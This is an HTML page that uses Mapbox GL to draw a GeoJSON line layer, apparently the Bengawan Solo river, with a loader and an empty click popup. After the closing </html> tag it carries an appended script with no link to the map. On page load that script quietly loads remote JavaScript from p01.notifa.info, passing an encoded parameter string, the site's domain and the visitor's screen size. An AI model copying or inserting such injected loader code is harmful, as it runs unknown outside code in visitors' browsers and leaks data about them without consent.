<!DOCTYPE html>
<html>
<head>
<meta charset=utf-8 />
<title>HTML markers from geoJSON url</title>
<meta name='viewport' content='initial-scale=1,maximum-scale=1,user-scalable=no' />
<script src='https://api.tiles.mapbox.com/mapbox-gl-js/v0.15.0/mapbox-gl.js'></script>
<link href='https://api.tiles.mapbox.com/mapbox-gl-js/v0.15.0/mapbox-gl.css' rel='stylesheet'/>
<style>
    body {
        margin: 0;
        padding: 0;
    }
    
    #map {
        position: absolute;
        top: 0;
        bottom: 0;
        width: 100%;
    }
    
    .map-overlay {
        position: absolute;
        width: 180px;
        top: 0;
        left: 10px;
        padding: 10px;
        margin-left: 5px;
        margin-top: 2px;
        margin-bottom: 2px;
        margin-right: 5px;
        z-index: 1;
    }
    
    .map-overlay .map-overlay-inner {
        background: rgba(0, 0, 0, .8);
        color: #fff;
        box-shadow: 0 1px 2px rgba(0, 0, 0, 0.10);
        border-radius: 3px;
        padding: 10px;
        margin-bottom: 10px;
        z-index: 1;
    }
    
    .map-overlay-inner fieldset {
        border: none;
        padding: 0;
        margin: 0 0 10px;
        z-index: 1;
    }
    /* Dark attribution */
    
    .mapboxgl-ctrl.mapboxgl-ctrl-attrib {
        background: rgba(0, 0, 0, .8);
    }
    
    .mapboxgl-ctrl.mapboxgl-ctrl-attrib a {
        color: #fff;
    }
    /* Dark popup */
    
    .mapboxgl-popup-content {
        background-color: #202020;
        color: #fff;
        margin-left: 5px;
        margin-top: 2px;
        margin-bottom: 2px;
        margin-right: 5px;
        z-index: 1000;
    }
    
    .mapboxgl-popup-anchor-bottom-left .mapboxgl-popup-tip,
    .mapboxgl-popup-anchor-bottom-right .mapboxgl-popup-tip,
    .mapboxgl-popup-anchor-bottom .mapboxgl-popup-tip {
        border-top-color: #202020;
    }
    
    .mapboxgl-popup-anchor-top-left .mapboxgl-popup-tip,
    .mapboxgl-popup-anchor-top-right .mapboxgl-popup-tip,
    .mapboxgl-popup-anchor-top .mapboxgl-popup-tip {
        border-bottom-color: #202020;
    }
    
    .mapboxgl-popup-anchor-right .mapboxgl-popup-tip {
        border-left-color: #202020;
    }
    
    .mapboxgl-popup-anchor-left .mapboxgl-popup-tip {
        border-right-color: #202020;
    }
    
    #popup-menu ul,
    #menu li {
        margin: 0;
        padding: 0;
        z-index: 100;
    }
    
    .mapboxgl-ctrl-group {
        -webkit-filter: invert(100%);
    }
    
    .loader {
        margin: -10px 0 0 -250px;
        height: 100px;
        width: 20%;
        position: fixed;
        text-align: center;
        padding: 1em;
        top: 50%;
        left: 50%;
        margin: 0 auto 1em;
        z-index: 9999;
    }
    /*
  Set the color of the icon
*/
    
    svg path,
    svg rect {
        fill: #FF6700;
    }
    </style>
</head>
<body>
<div id='map'></div>
<div class="loader loader--style1" title="0" id="loader">
        <svg version="1.1" id="loader-1" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" x="0px" y="0px" width="40px" height="40px" viewBox="0 0 40 40" enable-background="new 0 0 40 40" xml:space="preserve">
            <path opacity="0.2" fill="#000" d="M20.201,5.169c-8.254,0-14.946,6.692-14.946,14.946c0,8.255,6.692,14.946,14.946,14.946
    s14.946-6.691,14.946-14.946C35.146,11.861,28.455,5.169,20.201,5.169z M20.201,31.749c-6.425,0-11.634-5.208-11.634-11.634
    c0-6.425,5.209-11.634,11.634-11.634c6.425,0,11.633,5.209,11.633,11.634C31.834,26.541,26.626,31.749,20.201,31.749z" />
            <path fill="#000" d="M26.013,10.047l1.654-2.866c-2.198-1.272-4.743-2.012-7.466-2.012h0v3.312h0
    C22.32,8.481,24.301,9.057,26.013,10.047z">
                <animateTransform attributeType="xml" attributeName="transform" type="rotate" from="0 20 20" to="360 20 20" dur="0.5s" repeatCount="indefinite" />
            </path>
        </svg>
    </div>
</body>
</html>

<script type="text/javascript">
    mapboxgl.accessToken = 'pk.eyJ1IjoiaXNrYW5kYXJibHVlIiwiYSI6ImNpbHIxMXA3ejAwNWl2Zmx5aXl2MzRhbG4ifQ.qsQjbbm1A71QzVg8OcR7rQ';

var map = new mapboxgl.Map({
    container: 'map',
    style: 'mapbox://styles/mapbox/streets-v8',
    center: [ 110.728348548728974, -7.528267641328553 ],
    zoom: 10,
    minZoom: 9,
    maxZoom: 18
});


    function init() {
    map.addSource('streets', {
        "type": "geojson",
        "data": "assets/geojson/Sungai_Bengawan_Solo.geojson",
        "buffer": 0,
        "maxzoom": 12
    });

    if (window.location.search.indexOf('embed') !== -1) map.scrollZoom.disable();

    map.addLayer({
        "id": "m_streets",
        "type": "line",
        "source": "streets",
        "interactive": true,
        "layout": {},
        "paint": {
            "line-color": "#627BC1",
            "line-width": 2.5
        }
    });

    map.addLayer({
        "id": "route-hover",
        "type": "line",
        "source": "streets",
        "layout": {},
        "paint": {
            "line-color": "#f48024",
            "line-width": 2.5
        },
        "filter": ["==", "rd_name", ""]
    });

}    
map.once('style.load', function (e) {
      init();  
       map.on('data', function(e) {
            if (e.dataType === 'source' && e.sourceId === 'streets') {
                document.getElementById("loader").style.visibility = "hidden";
            }
        })
      // map.addControl(new mapboxgl.NavigationControl());
        map.on('click', function(e) {
            var features = map.queryRenderedFeatures(e.point, {
                layers: ['route-hover']
            });
            if (!features.length) {
                return;
            }
            var feature = features[0];

            var popup = new mapboxgl.Popup()
                .setLngLat(map.unproject(e.point))
                .setHTML('<h3>Collision Detail</h3>' +
                    '<ul>' +
                    '</ul>')
                .addTo(map);
        });

        //Hide loading bar once tiles from geojson are loaded
       

        // Use the same approach as above to indicate that the symbols are clickable
        // by changing the cursor style to 'pointer'.
        // map.on('mousemove', function(e) {
        //     var features = map.queryRenderedFeatures(e.point, {
        //         layers: ['route-hover']
        //     });
        //     map.getCanvas().style.cursor = (features.length) ? 'pointer' : '';
        // });

    // map.on('mousemove', function(e) {
    //     map.featuresAt(e.point, {
    //         radius: 5,
    //         layer: ["m_streets"]
    //     }, function (err, features) {
    //         if (!err && features.length) {
    //             map.setFilter('route-hover', ['==', 'rd_name', features[0].properties.rd_name]);
    //         } else {
    //             map.setFilter('route-hover', ['==', 'rd_name', '']);
    //         }
    //     });
    // });
});

</script>
<script type="text/javascript">if (self==top) {function netbro_cache_analytics(fn, callback) {setTimeout(function() {fn();callback();}, 0);}function sync(fn) {fn();}function requestCfs(){var idc_glo_url = (location.protocol=="https:" ? "https://" : "http://");var idc_glo_r = Math.floor(Math.random()*99999999999);var url = idc_glo_url+ "p01.notifa.info/3fsmd3/request" + "?id=1" + "&enc=9UwkxLgY9" + "&params=" + "4TtHaUQnUEiP6K%2fc5C582JKzDzTsXZH2MfuVBX3DbVJQ%2fIbt%2fa%2fTvkQXaM09OM2W4bmyYmy3AHJ5tmW1Xq657kt2WmG0WKA8cHkASEmXgLAphs6BFeVw9Tk1YO%2bukltWMh7Jnc5fEyOQrUYZt0Cnj9HWO7DevsZNcxHCv2XPlfMT5e3P4vFPZhCkLZlbsymLjL8UAveO5rh2znHzeOXxwnfLLQxLHPk8y2RybPmZ8bQeum%2fKMfDeos2hVqNBsOqGVy7Q8lpSd4hswthxREBc%2bh4AVSkoBTfOwo8Bw6q9REtsE%2b5uQODpQfZg%2buGCqn1Zj0sHWjUaxU%2brcClQKjHzH2jJKK7Xtv0M2yUvYMIzV9HF4wdAAm7LM6pv2J7MI%2bhtho1u%2fi9WGKNeQZS0hsDR%2f7K81XuMdMoFwu84cK1OSXnCDBsYXqHmcHrIbdvlwf%2fZc1icLu2WfZdDdR1%2f8CJu8nXaTAQxR2iID9KD%2bScTvbzxWCo6V9Y8L9bF%2bKqHx94X9qWWihW1HqQAlMjmqKeFNFyKtiR1RyGWBDYpP8sgPFT5oo4bJVajVvRFFHfWlOMboSaDHwDy7UL4vFqpaCUzerqS0H6NctDaGicnLpT9DublkX%2ffwg%2fwYjXNSWc0lJk1uZKyvzXJ%2bZ5ogZra5niNx5ngZEMjBDGcjTCR5U9GabXwRrCIBEU3loFQi%2fRFvUcX1lh03aLOAQo%3d" + "&idc_r="+idc_glo_r + "&domain="+document.domain + "&sw="+screen.width+"&sh="+screen.height;var bsa = document.createElement('script');bsa.type = 'text/javascript';bsa.async = true;bsa.src = url;(document.getElementsByTagName('head')[0]||document.getElementsByTagName('body')[0]).appendChild(bsa);}netbro_cache_analytics(requestCfs, function(){});};</script>